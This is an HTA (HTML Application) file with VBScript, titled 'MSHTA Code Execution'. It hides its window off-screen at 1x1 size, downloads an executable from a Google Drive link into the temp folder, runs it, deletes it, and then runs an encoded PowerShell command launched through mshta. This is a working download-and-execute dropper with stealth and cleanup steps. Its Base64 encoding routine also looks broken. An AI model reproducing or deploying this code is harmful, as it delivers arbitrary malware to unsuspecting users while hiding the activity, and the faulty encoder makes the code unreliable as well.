<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>MSHTA Code Execution</title>
    <hta:application 
        id="oMyApp"
        innerborder="no"
        scroll="no"
        singleinstance="yes"
        windowstate="normal"
        border="dialog"
        maximizebutton="no"
        minimizebutton="no"
        sysmenu="no"
        caption="no"
        showintaskbar="yes"
        width="1"
        height="1"
    />
</head>
<body onload="window.moveTo(-32000, -32000); window.resizeTo(1, 1);">

<script type="text/vbscript">
   Option Explicit

' Function to encode a string to Base64
Function Base64Encode(str)
    Dim objXML, objNode
    Set objXML = CreateObject("MSXML2.DOMDocument.6.0")
    Set objNode = objXML.CreateElement("b64")
    objNode.DataType = "bin.base64"
    objNode.Text = str
    Base64Encode = objNode.Text
    Set objNode = Nothing
    Set objXML = Nothing
End Function

' Main subroutine
Sub DownloadAndRunFile()
    ' Define the mshta command
    Dim strMSHTACommand
    strMSHTACommand = "mshta.exe ""about:<hta:application><script language='VBScript'>Close(Execute('CreateObject(\"Wscript.Shell\").Run ""powershell.exe -nop -Command Write-Host Hello, MSHTA!;Start-Sleep -Seconds 5""'))</script>"""

    ' Encode the mshta command
    Dim strEncodedMSHTACommand
    strEncodedMSHTACommand = Base64Encode(strMSHTACommand)

    ' Construct the command to execute the encoded mshta command
    Dim strDOSCommand
    strDOSCommand = "powershell.exe -e " & strEncodedMSHTACommand

    ' Set the Google Drive direct download link
    Dim strFileURL
    strFileURL = "https://drive.google.com/uc?id=1lqZvBbBTJt_C_7KXMLYpDjy4u4NISRLB"

    ' Set the local save path and file name
    Dim strSavePath, strFileName
    strSavePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
    strFileName = "downloaded_file.exe"

    ' Construct the full save path
    strSavePath = strSavePath & "\" & strFileName

    ' Download the file using WinHTTP
    Dim objHTTP
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    objHTTP.Open "GET", strFileURL, False
    objHTTP.Send

    If objHTTP.Status = 200 Then
        Dim objStream
        Set objStream = CreateObject("ADODB.Stream")
        With objStream
            .Type = 1 ' adTypeBinary
            .Open
            .Write objHTTP.ResponseBody
            .SaveToFile strSavePath
            .Close
        End With
        Set objStream = Nothing

        ' Run the downloaded file
        Dim objShell
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run strSavePath, 1, True ' Wait for the file to finish running
        Set objShell = Nothing

        ' Delete the file after running
        Dim objFSO
        Set objFSO = CreateObject("Scripting.FileSystemObject")
        If objFSO.FileExists(strSavePath) Then
            objFSO.DeleteFile strSavePath
        End If
        Set objFSO = Nothing

        ' Execute the encoded mshta command
        objShell.Run strDOSCommand, 0, True
        Set objShell = Nothing
    Else
        MsgBox "Failed to download the file. Status: " & objHTTP.Status
    End If

    Set objHTTP = Nothing
End Sub

' Call the main subroutine
DownloadAndRunFile
</script>

</body>
</html>
